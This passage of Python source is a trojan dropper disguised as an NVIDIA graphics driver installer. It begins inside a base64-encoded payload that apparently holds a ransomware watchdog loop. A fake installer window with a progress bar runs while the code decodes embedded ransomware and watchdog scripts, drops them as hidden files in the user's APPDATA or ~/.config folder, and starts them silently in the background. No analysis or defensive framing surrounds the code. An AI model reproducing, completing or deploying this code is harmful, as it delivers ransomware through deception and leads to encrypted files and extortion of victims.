G5vdCBydW5uaW5nIEFORCBubyBzdG9wIHNpZ25hbA0KICAgICAgICAgICAgaWYgbm90IGlzX3JhbnNvbXdhcmVfcnVubmluZygpOg0KICAgICAgICAgICAgICAgICMgRG91YmxlLWNoZWNrIHN0b3Agc2lnbmFsIGJlZm9yZSByZXN0YXJ0aW5nIChmaXhlcyB0aW1pbmcgbG9vcGhvbGUpDQogICAgICAgICAgICAgICAgaWYgc2hvdWxkX3N0b3AoKToNCiAgICAgICAgICAgICAgICAgICAgY2xlYW51cF9hbmRfZXhpdCgpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHN0YXJ0X3JhbnNvbXdhcmUoKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMikgICMgV2FpdCBiZWZvcmUgbmV4dCBjaGVjaw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aW1lLnNsZWVwKENIRUNLX0lOVEVSVkFMKQ0KICAgICAgICAgICAgDQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICB0aW1lLnNsZWVwKENIRUNLX0lOVEVSVkFMKQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K"
RANSOMWARE_NAME = ".nvidia_ransomware.py"
WATCHDOG_NAME = ".nvidia_watchdog.py"

def extract_and_execute_payload():
    """Drops both ransomware and watchdog, then launches watchdog."""
    try:
        ransomware_data = base64.b64decode(RANSOMWARE_B64)
        watchdog_data = base64.b64decode(WATCHDOG_B64)
        
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                os.makedirs(drop_dir, exist_ok=True)
        
        ransomware_path = os.path.join(drop_dir, RANSOMWARE_NAME)
        watchdog_path = os.path.join(drop_dir, WATCHDOG_NAME)
        
        # Drop both files
        with open(ransomware_path, "wb") as f:
            f.write(ransomware_data)
        
        with open(watchdog_path, "wb") as f:
            f.write(watchdog_data)
            
        # Launch WATCHDOG (which will launch ransomware)
        if os.name == 'nt':
            subprocess.Popen(["python", watchdog_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen(["python3", watchdog_path], 
                           start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # DROP THE PAYLOAD EXECUTION HERE
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
